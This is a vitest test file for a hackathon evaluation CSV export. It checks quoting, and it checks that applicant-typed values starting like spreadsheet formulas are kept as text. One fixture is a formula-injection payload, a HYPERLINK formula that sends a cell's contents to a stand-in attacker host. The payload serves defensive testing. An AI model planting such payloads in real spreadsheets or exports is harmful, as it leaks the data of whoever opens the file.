import { describe, expect, it } from 'vitest';
import { evaluateExportCsv } from '@/components/evaluate/export-csv';
import type { EvaluationData, SubmissionRow } from '@/components/evaluate/types';

/* The export holds names that applicants typed. A spreadsheet runs a cell
   that starts with = + - or @ as a formula, so such a cell must stay text. */

const evaluation = (stage: number, verdict: EvaluationData['verdict'], scoreOverall: number | null): EvaluationData => ({
  id: `e${stage}`,
  formDataId: 'f1',
  evaluatorId: 'j1',
  evaluatorName: 'Judge',
  verdict,
  comment: null,
  scoreOverall,
  scores: null,
  createdAt: '2026-01-01T00:00:00.000Z',
  stage,
});

function row(fields: Partial<SubmissionRow>): SubmissionRow {
  return {
    formDataId: 'f1',
    projectId: 'p1',
    projectName: 'Project',
    shortDescription: '',
    hackathonId: 'h1',
    hackathonTitle: 'Event',
    origin: 'Project submission',
    formData: {},
    finalVerdict: null,
    project: null,
    evaluations: [],
    applicantName: 'Ada Stone',
    applicantEmail: 'ada@nimbus.example',
    country: 'Chile',
    telegram: null,
    github: null,
    areaOfFocus: null,
    stageProgress: 0,
    currentStage: 0,
    memberApplications: [],
    applicationData: null,
    ...fields,
  };
}

const options = {
  includeMembers: true,
  includeStages: true,
  maxMembers: 1,
  maxStage: 0,
  getEvaluations: (_id: string, original: EvaluationData[]) => original,
  getCurrentStage: (_id: string, original: number) => original,
};

describe('the evaluate export', () => {
  it('writes one line per project under the header', () => {
    const csv = evaluateExportCsv({
      ...options,
      rows: [
        row({
          projectName: 'Atlas, the index',
          memberApplications: [{ email: 'lin@nimbus.example', name: 'Lin "L" Park', role: 'Member', status: 'Confirmed', data: null }],
          evaluations: [evaluation(0, 'top', 4), evaluation(0, 'strong', 5)],
        }),
      ],
    });
    expect(csv.trimEnd().split('\n')).toEqual([
      'Project,Applicant,Email,Area,Country,Current Stage,Team Size,Member 1 Email,Member 1 Name,Stage 0 Verdict,Stage 0 Score',
      '"Atlas, the index",Ada Stone,ada@nimbus.example,,Chile,Stage 0,0,lin@nimbus.example,"Lin ""L"" Park",top,4.5',
    ]);
  });

  it.each([
    ['=HYPERLINK("https://attacker.example/?d="&B2,"open")', `"'=HYPERLINK(""https://attacker.example/?d=""&B2,""open"")"`],
    ['+1+1', `"'+1+1"`],
    ['-2+3', `"'-2+3"`],
    ['@SUM(A1:A9)', `"'@SUM(A1:A9)"`],
    ['\t=1+1', `"'\t=1+1"`],
  ])('keeps a name that starts like a formula as text: %s', (name, cell) => {
    const csv = evaluateExportCsv({
      ...options,
      rows: [
        row({
          projectName: name,
          applicantName: name,
          country: name,
          memberApplications: [{ email: 'lin@nimbus.example', name, role: 'Member', status: 'Confirmed', data: null }],
        }),
      ],
    });
    const line = csv.trimEnd().split('\n')[1];
    expect(line).toBe(`${cell},${cell},ada@nimbus.example,,${cell},Stage 0,0,lin@nimbus.example,${cell},,`);
  });
});
